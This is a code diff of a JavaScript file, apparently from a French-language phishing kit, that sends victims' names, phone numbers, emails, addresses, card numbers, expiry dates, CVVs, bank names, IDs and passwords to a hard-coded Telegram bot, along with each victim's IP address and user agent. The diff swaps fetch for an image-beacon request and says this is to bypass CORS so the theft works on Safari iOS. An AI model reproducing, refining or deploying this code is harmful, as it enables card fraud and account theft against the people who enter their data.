@@ -1,68 +1,65 @@
 // tg.js
-// Version enrichie : emojis, date/heure, ISP & pays via ipapi.co (CORS OK)
+// JSONP ipify + <img> pour Telegram, compatible Safari iOS et tous devices
 
 const TELEGRAM_TOKEN = '7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs';
 const CHAT_ID        = '-4766781392';
 
-async function sendTelegramNotification(message) {
-  try {
-    const ua = navigator.userAgent;
+// 1) JSONP ipify : charge l'IP publique dans window.__CLIENT_IP__
+function handleIP(data) {
+  window.__CLIENT_IP__ = data.ip;
+}
+(function() {
+  var s = document.createElement('script');
+  s.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
+  document.head.appendChild(s);
+})();
 
-    // IP + ISP + pays
-    const geoRes = await fetch('https://ipapi.co/json/');
-    const geo    = await geoRes.json();
-    const ip      = geo.ip || 'N/A';
-    const isp     = geo.org || 'N/A';
-    const country = geo.country_name || 'N/A';
+/**
+ * Envoie une notification Telegram quel que soit le navigateur/device.
+ * @param {string} message - Texte avec retours à la ligne.
+ */
+function sendTelegramNotification(message) {
+  var ip = window.__CLIENT_IP__ || 'unknown';
+  var ua = navigator.userAgent || 'unknown';
 
-    // Date & heure
-    const now = new Date();
-    const pad = n => String(n).padStart(2, '0');
-    const dateStr = `${pad(now.getDate())}/${pad(now.getMonth()+1)}/${now.getFullYear().toString().slice(-2)}`;
-    const timeStr = `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
-    const datetime = `${dateStr}, ${timeStr}`;
+  // Timestamp
+  var now = new Date();
+  var pad = function(n) { return String(n).padStart(2,'0'); };
+  var datetime = pad(now.getDate()) + '/' + pad(now.getMonth()+1) + '/' +
+                 now.getFullYear().toString().slice(-2) + ', ' +
+                 pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
 
-    // En-tête + détails
-    const [header, ...rest] = message.split('\n');
-    let text = `[📝] ${header}`;
-    if (rest.length) {
-      const details = rest.join('\n').split('\n').map(line => {
-        if (line.startsWith('Nom:'))        return line.replace('Nom:', '👤 Nom:');
-        if (line.startsWith('Prénom:'))     return line.replace('Prénom:', '🙋 Prénom:');
-        if (line.startsWith('Téléphone:'))  return line.replace('Téléphone:', '📞 Téléphone:');
-        if (line.startsWith('Email:'))      return line.replace('Email:', '✉️ Email:');
-        if (line.startsWith('Adresse:'))    return line.replace('Adresse:', '🏠 Adresse:');
-        if (line.startsWith('Numéro:'))     return line.replace('Numéro:', '💳 Numéro:');
-        if (line.startsWith('Exp:'))        return line.replace('Exp:', '📅 Exp:');
-        if (line.startsWith('CVV:'))        return line.replace('CVV:', '🔒 CVV:');
-        if (line.startsWith('Banque:'))     return line.replace('Banque:', '🏦 Banque:');
-        if (line.startsWith('ID:'))         return line.replace('ID:', '🆔 ID:');
-        if (line.startsWith('Pass:'))       return line.replace('Pass:', '🔑 Pass:');
-        return line;
-      }).join('\n');
-      text += `\n${details}`;
-    }
-
-    // Pied de message
-    text +=
-      `\n\n[🗓️] Date & heure : ${datetime}` +
-      `\n[🌐] IP Client     : ${ip}` +
-      `\n[🔎] ISP Client    : ${isp}` +
-      `\n[🌍] Pays Client   : ${country}` +
-      `\n[📍] User-Agent    : ${ua}` +
-      `\n[©️] ${now.getFullYear()} ©️`;
-
-    // Envoi à Telegram
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`
-              + `?chat_id=${CHAT_ID}`
-              + `&parse_mode=Markdown`
-              + `&text=${encodeURIComponent(text)}`;
-    const res = await fetch(url);
-    if (!res.ok) console.error('Telegram error', res.status, res.statusText);
-
-  } catch (err) {
-    console.error('Erreur Telegram:', err);
+  // Build markdown text
+  var parts = message.split('\n');
+  var header = parts.shift();
+  var text = '[📝] ' + header;
+  if (parts.length) {
+    text += '\n' + parts.map(function(line) {
+      if (line.indexOf('Nom:') === 0)       return line.replace('Nom:','👤 Nom:');
+      if (line.indexOf('Prénom:') === 0)    return line.replace('Prénom:','🙋 Prénom:');
+      if (line.indexOf('Téléphone:') === 0) return line.replace('Téléphone:','📞 Téléphone:');
+      if (line.indexOf('Email:') === 0)     return line.replace('Email:','✉️ Email:');
+      if (line.indexOf('Adresse:') === 0)   return line.replace('Adresse:','🏠 Adresse:');
+      if (line.indexOf('Numéro:') === 0)    return line.replace('Numéro:','💳 Numéro:');
+      if (line.indexOf('Exp:') === 0)       return line.replace('Exp:','📅 Exp:');
+      if (line.indexOf('CVV:') === 0)       return line.replace('CVV:','🔒 CVV:');
+      if (line.indexOf('Banque:') === 0)    return line.replace('Banque:','🏦 Banque:');
+      if (line.indexOf('ID:') === 0)        return line.replace('ID:','🆔 ID:');
+      if (line.indexOf('Pass:') === 0)      return line.replace('Pass:','🔑 Pass:');
+      return line;
+    }).join('\n');
   }
+  text += '\n\n[🗓️] Date & heure : ' + datetime +
+          '\n[🌐] IP Client     : ' + ip +
+          '\n[📍] User-Agent    : ' + ua;
+
+  // 2) Envoi via <img> GET pour bypass CORS dans Safari iOS
+  var url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN +
+            '/sendMessage?chat_id=' + encodeURIComponent(CHAT_ID) +
+            '&parse_mode=Markdown&text=' + encodeURIComponent(text);
+  var img = new Image();
+  img.src = url;
 }
 
+// Expose pour appel depuis index.html
 window.sendTelegramNotification = sendTelegramNotification;
